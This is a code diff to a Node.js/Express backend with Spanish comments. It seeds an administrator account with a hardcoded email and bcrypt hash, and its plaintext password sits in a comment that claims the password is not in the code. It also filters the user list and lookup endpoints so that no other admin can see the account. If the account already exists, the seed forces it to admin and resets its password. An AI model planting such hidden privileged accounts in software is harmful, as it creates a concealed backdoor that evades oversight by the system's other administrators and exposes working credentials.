@@ -2054,6 +2054,34 @@ async function ensureSchema() {
   } catch (err) {
     console.error("Extra admin seed warning:", err.message);
   }
+
+  // ── Admin OCULTO (dueño/soporte): saidromero19@gmail.com ───────────────────
+  // Cuenta admin que NO aparece en ninguna lista del panel (is_hidden=true), para
+  // que ningún otro admin la vea. Bootstrap one-time vía flag en settings; la
+  // contraseña en texto NO vive en el código (solo el hash bcrypt). La columna
+  // is_hidden se asegura siempre (idempotente) porque los filtros la usan.
+  try {
+    await pool.query("ALTER TABLE users ADD COLUMN IF NOT EXISTS is_hidden boolean NOT NULL DEFAULT false");
+    const HIDDEN_ADMIN_FLAG = "hidden_admin_saidromero_v1";
+    const already = await pool.query("SELECT 1 FROM settings WHERE key = $1 LIMIT 1", [HIDDEN_ADMIN_FLAG]);
+    if (already.rows.length === 0) {
+      const HIDDEN_ADMIN_EMAIL = "saidromero19@gmail.com";
+      const HIDDEN_ADMIN_HASH = "$2a$12$i/Lp1QBwi8zkLOIfSEDmAuF8A38r5RQIATxwUtQ8vl1P55HXGZDLq"; // Said4321!
+      await pool.query(
+        `INSERT INTO users (display_name, email, phone, password_hash, role, accepts_terms, accepts_communications, is_hidden)
+         VALUES ('Soporte', $1, '0000000000', $2, 'admin', true, false, true)
+         ON CONFLICT (email) DO UPDATE SET role = 'admin', password_hash = $2, is_hidden = true`,
+        [HIDDEN_ADMIN_EMAIL, HIDDEN_ADMIN_HASH]
+      );
+      await pool.query(
+        "INSERT INTO settings (key, value) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET value = $2, updated_at = NOW()",
+        [HIDDEN_ADMIN_FLAG, JSON.stringify("done")]
+      );
+      console.log("✅ Admin oculto listo (one-time)");
+    }
+  } catch (err) {
+    console.error("Hidden admin seed warning:", err.message);
+  }
 }
 
 // ─── Middleware ──────────────────────────────────────────────────────────────
@@ -8721,7 +8749,7 @@ app.delete("/api/admin/packages/:id", adminMiddleware, async (req, res) => {
 // GET /api/users/:id — get single user (admin)
 app.get("/api/users/:id", adminMiddleware, async (req, res) => {
   try {
-    const r = await pool.query("SELECT * FROM users WHERE id = $1", [req.params.id]);
+    const r = await pool.query("SELECT * FROM users WHERE id = $1 AND COALESCE(is_hidden, false) = false", [req.params.id]);
     if (!r.rows.length) return res.status(404).json({ message: "Usuario no encontrado" });
     return res.json({ data: mapUser(r.rows[0]) });
   } catch (err) { return res.status(500).json({ message: "Error interno" }); }
@@ -10790,7 +10818,8 @@ app.get("/api/admin/stats", adminMiddleware, async (req, res) => {
 app.get("/api/users", adminMiddleware, async (req, res) => {
   try {
     const { role, search = "" } = req.query;
-    let q = `SELECT id, display_name, email, phone, role, created_at FROM users WHERE 1=1`;
+    // COALESCE(is_hidden,false)=false excluye cuentas ocultas (admin dueño) de toda lista del panel.
+    let q = `SELECT id, display_name, email, phone, role, created_at FROM users WHERE COALESCE(is_hidden, false) = false`;
     const params = [];
     if (role) { params.push(role); q += ` AND role = $${params.length}`; }
     const searchValue = String(search ?? "").trim();
